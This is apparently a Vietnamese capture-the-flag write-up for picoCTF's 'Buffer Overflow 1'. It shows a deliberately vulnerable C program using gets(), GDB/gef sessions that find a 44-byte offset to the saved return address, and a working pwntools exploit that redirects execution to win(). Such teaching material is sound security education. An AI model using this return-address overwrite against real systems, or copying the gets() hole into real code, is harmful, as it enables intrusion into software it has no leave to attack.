# Buffer Overflow 1

## Description

> Control the return address and arguments

## Solution

```bash
➜  BOF_1 checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               3               vuln
➜  BOF_1 file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

Đây là 1 ELF 32-bit và không có Stack Canary

Hãy xem sơ qua source code xem nó có gì:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Chương trình gọi hàm vuln() để lấy đầu vào của chúng ta, điều đặc biệt là hàm này sử dụng get(). Điều này cho phép chúng ta thực hiện buffer overflow

Trước hết hãy tìm offset của nó bằng GDB

```bash
gef➤  b*0x08049327
Breakpoint 1 at 0x8049327
gef➤  r
Starting program: /home/alter/Pico/pwn/BOF_1/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:

Breakpoint 1, 0x08049327 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1b
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xf7faf8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccb0  →  0x0804a0a0  →  "Please enter your string: "
$ebp   : 0xffffccd8  →  0x00000000
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x08049327  →  <main+0063> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccb0│+0x0000: 0x0804a0a0  →  "Please enter your string: "  ← $esp
0xffffccb4│+0x0004: 0x000003e8
0xffffccb8│+0x0008: 0x000003e8
0xffffccbc│+0x000c: 0x08049301  →  <main+003d> mov DWORD PTR [ebp-0xc], eax
0xffffccc0│+0x0010: 0xffffffff
0xffffccc4│+0x0014: 0xf7d9696c  →  0x00000914
0xffffccc8│+0x0018: 0xf7fc1400  →  0xf7d85000  →  0x464c457f
0xffffcccc│+0x001c: 0x000003e8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804931b <main+0057>      lea    eax, [ebx-0x1f60]
    0x8049321 <main+005d>      push   eax
    0x8049322 <main+005e>      call   0x8049080 <puts@plt>
●→  0x8049327 <main+0063>      add    esp, 0x10
    0x804932a <main+0066>      call   0x8049281 <vuln>
    0x804932f <main+006b>      mov    eax, 0x0
    0x8049334 <main+0070>      lea    esp, [ebp-0x8]
    0x8049337 <main+0073>      pop    ecx
    0x8049338 <main+0074>      pop    ebx
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049327 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049327 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
0x0804932a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1b
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xf7faf8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccc0  →  0xffffffff
$ebp   : 0xffffccd8  →  0x00000000
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x0804932a  →  0xffff52e8  →  0x00000000
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc0│+0x0000: 0xffffffff   ← $esp
0xffffccc4│+0x0004: 0xf7d9696c  →  0x00000914
0xffffccc8│+0x0008: 0xf7fc1400  →  0xf7d85000  →  0x464c457f
0xffffcccc│+0x000c: 0x000003e8
0xffffccd0│+0x0010: 0xffffccf0  →  0x00000001
0xffffccd4│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffccd8│+0x0018: 0x00000000   ← $ebp
0xffffccdc│+0x001c: 0xf7da9c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049321 <main+005d>      push   eax
    0x8049322 <main+005e>      call   0x8049080 <puts@plt>
●   0x8049327 <main+0063>      add    esp, 0x10
 →  0x804932a <main+0066>      call   0x8049281 <vuln>
   ↳   0x8049281 <vuln+0000>      endbr32
       0x8049285 <vuln+0004>      push   ebp
       0x8049286 <vuln+0005>      mov    ebp, esp
       0x8049288 <vuln+0007>      push   ebx
       0x8049289 <vuln+0008>      sub    esp, 0x24
       0x804928c <vuln+000b>      call   0x8049130 <__x86.get_pc_thunk.bx>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
vuln (
   [sp + 0x0] = 0xffffffff
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804932a in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804932a → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern create 60
[+] Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
[+] Saved as '$_gef0'
gef➤  ni
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xffffccc0  →  "maaanaaaoaaa"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc0│+0x0000: "maaanaaaoaaa"       ← $esp
0xffffccc4│+0x0004: "naaaoaaa"
0xffffccc8│+0x0008: "oaaa"
0xffffcccc│+0x000c: 0x00000300
0xffffccd0│+0x0010: 0xffffccf0  →  0x00000001
0xffffccd4│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffccd8│+0x0018: 0x00000000
0xffffccdc│+0x001c: 0xf7da9c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ta có thể thấy khi ta tạo 1 pattern với độ dài là 60 và input nó thì chương trình đã dừng lại tại 0x6161616c và cho ra lỗi là SIGSEGV. Điều này là do EIP đã bị ghi đè khiến cho chương trình không xác định đương câu lệnh tiếp theo nó sẽ thực hiện là gì dẫn đến việc bị chết chương trình

Ta có thể hình dung rõ hơn bằng cách nhập 1 input khác ví dụ như **helloiloveyou**&#x20;

```bash
gef➤
0x0804933d in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0
$ebx   : 0xf7fade34  →  0x00228d2c
$ecx   : 0xffffccf0  →  0x00000001
$edx   : 0x0
$esp   : 0xffffccec  →  0xf7da9c75  →   add esp, 0x10
$ebp   : 0x0
$esi   : 0x08049350  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x0804933d  →  <main+0079> ret
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccec│+0x0000: 0xf7da9c75  →   add esp, 0x10        ← $esp
0xffffccf0│+0x0004: 0x00000001
0xffffccf4│+0x0008: 0xffffcda4  →  0xffffcf07  →  "/home/alter/Pico/pwn/BOF_1/vuln"
0xffffccf8│+0x000c: 0xffffcdac  →  0xffffcf27  →  "HOSTTYPE=x86_64"
0xffffccfc│+0x0010: 0xffffcd10  →  0xf7fade34  →  0x00228d2c
0xffffcd00│+0x0014: 0xf7fade34  →  0x00228d2c
0xffffcd04│+0x0018: 0x080492c4  →  <main+0000> endbr32
0xffffcd08│+0x001c: 0x00000001
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049338 <main+0074>      pop    ebx
    0x8049339 <main+0075>      pop    ebp
    0x804933a <main+0076>      lea    esp, [ecx-0x4]
 →  0x804933d <main+0079>      ret
   ↳  0xf7da9c75                  add    esp, 0x10
      0xf7da9c78                  sub    esp, 0xc
      0xf7da9c7b                  push   eax
      0xf7da9c7c                  call   0xf7dc35c0 <exit>
      0xf7da9c81                  call   0xf7e0c9b0
      0xf7da9c86                  mov    eax, DWORD PTR [esp]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804933d in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804933d → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0xffffccf0:
 eip = 0x804933d in main; saved eip = 0xf7da9c75
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffccf0
 Saved registers:
  eip at 0xffffccec
```

Ta có thể nhìn ở stack, tại vị trí 0xffffccec nó lưu giá trị của lệnh tiếp theo sẽ được thực thi sau khi ret

hay còn gọi địa chỉ đó là địa chỉ của saved EIP. Khi ret được thực hiện, giá trị tại ESP sẽ được gán vào cho EIP và khiến luồng chương trình thực thi theo đó. Vậy điều chúng ta cần làm là kiểm soát được địa chỉ trả về của chúng sau khi ret (ở đây là hàm win) và sẽ giải quyết xong vấn đề này

```bash
gef➤  pattern offset 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

Offset từ input đến saved EIP là 44 và nhiêu đây cũng đã đủ để ta viết exploit

## Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./vuln', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x0804933d
c
''')

p = remote('saturn.picoctf.net', 59056) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

payload = b'A'*44
payload += p32(exe.sym['win'])

sla(b'string:',payload)
p.interactive()
```

```bash
➜  BOF_1 echo 'FLAG{helloiloveyou}' > flag.txt
➜  BOF_1 python3 exploit.py
[+] Starting local process '/home/alter/Pico/pwn/BOF_1/vuln': pid 3480
[!] ASLR is disabled!
[*] Switching to interactive mode

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
FLAG{helloiloveyou}
[*] Got EOF while reading in interactive
```
